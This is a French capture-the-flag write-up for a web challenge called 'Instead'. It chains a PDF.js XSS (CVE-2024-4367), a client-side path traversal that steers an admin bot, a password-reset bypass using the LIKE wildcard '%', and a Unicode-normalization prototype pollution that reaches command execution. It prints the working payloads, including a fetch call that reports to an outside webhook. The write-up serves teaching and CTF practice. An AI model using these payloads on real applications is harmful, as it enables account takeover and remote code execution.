# Instead 
> Auteur : Al-oxos

## Solve

Le challenge se résout en découvrant et utilisant une suite de vulnérabilités/mauvaises configurations qui chainées les unes avec les autres permettent de RCE :

#### Exécution de JavaScript via PDF.js (CVE-2024-4367)
La version de PDF.js utilisée est vulnérable à la CVE-2024-4367, permettant d'exécuter du JavaScript contenu dans un fichier PDF et donc de XSS tout utilisateur qui visiterait le cv que nous avons uploadé.

#### Contrôle de la navigation du bot
Le code permet de forcer le bot à visiter n'importe quelle route de l'application via une CSPT, bien que le bot ne visite initialement que le profil des utilisateurs (après report). Nous pouvons donc forcer le bot à accéder à notre PDF malicieux uploadé préalablement.

#### Réinitialisation du mot de passe via reset password et requête LIKE 
Une faille dans le contrôle du token de réinitialisation permet d'utiliser le caractère % pour matcher la requête LIKE. Ainsi, en envoyant un token partiel, nous pouvons réinitialiser le mot de passe du compte administrateur. En chainant cela avec la XSS précédente, nous pouvons modifier le mot de passe de l'administrateur et obtenir son compte.

#### Prototype pollution de le dashboard admin
Une fois administrateur, il est possible de modifier la configuration du dashboard (notamment la visibilité du healtcheck ou non). Cette action déclenche un merge qui parrait sécurisé au premier abord mais en raison de l'utilisation de la fonction normalize, il est possible de contourner simplement les filtres sur `__proto__, prototype et constructor`
Il suffit alors d'envoyer une requete de modification de la configuration en passant debug à true et en réalisant une prototype pollution en utilisant des char unicode qui une fois normalisé donneront `__proto__` et ainsi pouvoir réécrire le prototype du debugHealtcheck pour obtenir une exécution de code arbitraire.

## Exploitation

La description du challenge ne nous indique rien de très intéressant, mais nous disposons du code source de l'application WEB.

Maintenant que nous savons qu'il est possible d'utiliser la **CVE-2024-4367** dans PDF.js afin d'exécuter du javascript (on peut utiliser des tools publiques pour générer le pdf ou le faire soit même en suivant les articles présentant la vulnérabilité), que nous avons moyen de faire visiter n'importe quelle route de l'application à notre bot et que nous avons la possibilité de réinitialiser son mot de passe en utilisant un % afin de matcher la requete like, nous pouvons créer un fichier pdf malveillant avec un payload de la forme :

```javascript
// Code vulnerable lors du check du token de reset-password en raison d'un like trop permissif
const user = await this.findOne({
      where: {
        username,
        resetToken: { [Op.like]: providedToken },
        resetTokenExpiration: { [Op.gte]: new Date() }
      }
});
```

```javascript
fetch('/profile/reset-password',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},credentials:'include',body:'newPassword='+encodeURIComponent('Pwned!')+'&resetToken=%'}).then(r=>{if(r.ok){document.location='https://yoursite?d=PasswordChanged';}});
```

Une CSPT est possible sur la route de report car la regex ne match qu'un UUIDv4 mais il est possible de mettre ce que l'on veut derrière : 

```javascript
const id = req.params.id;
  if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i.test(id)) { //CSPT ici
    return res.status(400).json({ error: 'L\'ID doit être un UUIDv4.' });
}
```

En utilisant la CSPT, nous pouvons alors faire visiter à notre bot le cv malveillant que nous avons uploadé au préalable :

```
GET /user/report/id_admin_user%2f..%2f..%2fcv%2fid_du_pdf HTTP/1.1
```

Si tout s'est bien passé, nous devrions recevoir un message sur notre webhook nous indiquant que le mot de passe a été changé et nous pouvons nous connecter au compte administrateur avec le mot de passe `pwned!` comme nous l'avons définie dans notre script.

Une fois connecté en tant qu'admin, une nouvelle route est disponible et permet d'accéder au dashboard administrateur. Depuis ce dashboard, nous pouvons modifier la configuration du dashboard et notamment la valeur debug qu'il faudra passer à true. Il est également nécessaire de réussir à définir service.debugHealthcheck ce qui pourrait mener à exécuter le code de notre choix derrière et donc à avoir une rce. Cela est possible via une prototype pollution car la variable debugHealthcheck n'est pas définie par défaut grâce au commentaires.

```javascript
let service = {
    /* On suit les bonnes pratiques et on commentes le debug juste au cas ou
       debugHealthcheck: "echo 'Service en cours de maintenance'" */
};

const getHealthcheckCommand = (req, res) => {
    if (!adminConfig.showOption.display) {
        return "echo Service désactivé";
    }
    if(adminConfig.debug) {
        if (service.debugHealthcheck && service.debugHealthcheck !== "") {
            return service.debugHealthcheck;
        }
    }
    return healthcheck;
};
```

En analysant la fonction de merge custom créé, nous voyons qu'il est possible de contourner les filtres en place grâce à l'utilisation du normalize. Un payload fonctionnel pour obtenir le flag serait ainsi :

```javascript
export const SafeMerge = (target, source) => {
  Object.keys(source).forEach(Key => {
    if (["__proto__", "prototype", "constructor"].includes(Key)) return;
    const escKey = Key.normalize("NFKC"); // le normalize ici introduit une vulnérabilité
    const sourceValue = source[Key];
    if (typeof target[escKey] !== "undefined" && typeof sourceValue === "object" && sourceValue !== null) {
      target[escKey] = SafeMerge(target[escKey], sourceValue);
    } else {
      target[escKey] = sourceValue;
    }
  });
  return target;
}
```

```json
{
    "debug": true,
    "__proto_\uFF3F": {
        "debugHealthcheck": "cat flag.txt"
    }
}
```

# Flag
BZHCTF{Fr0m_PDF_t0_RC3_s0metim3s_1ts_th4t_ea5y}